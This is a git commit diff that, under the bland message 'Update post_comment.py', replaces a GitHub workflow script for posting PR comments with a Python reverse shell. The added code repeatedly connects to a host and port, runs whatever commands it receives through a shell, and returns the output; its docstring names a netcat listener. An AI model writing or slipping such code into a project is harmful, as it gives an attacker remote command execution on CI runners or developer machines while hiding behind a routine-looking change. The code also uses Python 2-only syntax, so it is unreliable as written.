adb7a64ca72ae469064dcc67b14cc3d0b54fcd65
Eli Uriegas <1700823+seemethere@users.noreply.github.com>
2024-10-08 11:01:48 -0700

    Update post_comment.py

--- .github/scripts/post_comment.py
+++ .github/scripts/post_comment.py
@@ -1,20 +1,47 @@
-#!/usr/bin/env python3
+""" 
+A simple reverse shell. In order to test the code you will need to run a server to listen to client's port.
+You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)	
+"""
 
-from github_utils import gh_post_pr_comment
-from gitutils import get_git_remote_name, get_git_repo_dir, GitRepo
 
-def parse_args():
-    from argparse import ArgumentParser
-    parser = ArgumentParser()
-    parser.add_argument("pr_num", type=int)
-    return parser.parse_args()
+# Set the host and the port.
+HOST = "127.0.0.1"
+PORT = 5002
+
+def connect((host, port)):
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
+	return s
+
+def wait_for_command(s):
+	data = s.recv(1024)
+	if data == "quit\n":
+		s.close()
+		sys.exit(0)
+	# the socket died
+	elif len(data)==0:
+		return True
+	else:
+		# do shell command
+		proc = subprocess.Popen(data, shell=True,
+			stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+			stdin=subprocess.PIPE)
+		stdout_value = proc.stdout.read() + proc.stderr.read()
+		s.send(stdout_value)
+		return False
 
 def main():
-    args = parse_args()
-    repo = GitRepo(get_git_repo_dir(), get_git_remote_name())
-    org, project = repo.gh_owner_and_name()
-    gh_post_pr_comment(org, project, args.pr_num, "Thanks for your PR!")
-
+	while True:
+		socket_died=False
+		try:
+			s=connect((HOST,PORT))
+			while not socket_died:
+				socket_died=wait_for_command(s)
+			s.close()
+		except socket.error:
+			pass
+		time.sleep(5)
 
 if __name__ == "__main__":
-    main()
+	import sys,os,subprocess,socket,time
+	sys.exit(main())
